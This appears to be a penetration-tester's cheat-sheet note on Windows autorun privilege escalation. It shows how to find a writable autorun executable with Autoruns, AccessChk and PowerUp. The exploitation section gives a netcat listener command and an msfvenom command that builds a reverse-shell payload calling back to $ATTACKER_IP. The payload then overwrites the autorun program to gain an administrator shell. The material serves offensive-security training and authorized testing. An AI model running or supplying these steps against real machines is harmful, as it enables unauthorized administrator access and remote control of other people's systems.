# <span style="color:#FF5555">Autorun</span>

> [!info] Variables used below
> - `$ATTACKER_IP` – your attacking machine's IP

## <span style="color:#8BE9FD">Methodology</span>

Autorun is a type of Registry Escalation.

To ensure that the IT department creates a secure environment, Windows administrators often need to know what kind of access specific users or groups have to resources, including files, directories, Registry keys, global objects, and Windows services. AccessChk quickly answers these questions with an intuitive interface and output.

So basically, we can say a particular application in a specific directory gets automatically executed with administrator privileges once he logs on. This can be abused by finding the path location and dropping our malicious executable file through which we will gain administrator access.

## <span style="color:#8BE9FD">Detection</span>

### <span style="color:#50FA7B">Using Autoruns and AccessChk</span>

1. Transfer [Autoruns64.exe](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) on the Windows/AD machine and execute it on cmd
```console
C:\Temp> Autoruns64.exe
```
![image](https://user-images.githubusercontent.com/59029171/161002365-bde92ae0-b7f4-4978-b2eb-44498e6c42fb.png)

2. In Autoruns, click on the `"Logon"` tab.
3. From the listed results, notice that the `"My Program"` entry is pointing to `"C:\Program Files\Autorun Program\program.exe"`.
4. Go back to the command prompt run [AccessChk64.exe](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)

```console
C:\Temp> accesschk64.exe -wvu "C:\Program Files\Autorun Program"

# Switch meaning
# w --> only show items that have write access
# v --> verbose; dispaly as many details as possible
# u --> ignore the errors
```

![image](https://user-images.githubusercontent.com/59029171/161004322-76f2e4e8-876c-4c00-abf5-7e0be381fdfd.png)

### <span style="color:#50FA7B">Using PowerUp</span>

1. Run [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1) and Run `Invoke-AllChecks` (check the autoruns field)

```console
C:\Temp> powershell -ep bypass
PS C:\Temp>. .\PowerUp.sp1
PS C:\Temp> Invoke-AllChecks
```
![image](https://user-images.githubusercontent.com/59029171/161005302-73ecbb10-e186-4a84-b086-c271976655f5.png)

From the output, notice that the `"Everyone"` user group has `"FILE_ALL_ACCESS"` permission on the `"program.exe"` file. To gain administrator access, we can drop our malicious executable file by overwriting on the file.

## <span style="color:#8BE9FD">Exploitation</span>

### <span style="color:#50FA7B">Kali VM</span>

1. Start a netcat listener
```console
$ sudo nc -nvlp 53
```

2. Open an additional command prompt and type: 
```console
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ATTACKER_IP LPORT=53 -f exe -o program.exe
```
3. Transfer the generated file, `program.exe`, to the Windows VM.

### <span style="color:#50FA7B">Windows VM</span>

1. replace `program.exe` in `'C:\Program Files\Autorun Program'`

### <span style="color:#50FA7B">Kali VM</span>

1. Wait for a reverse shell on your kali machine.


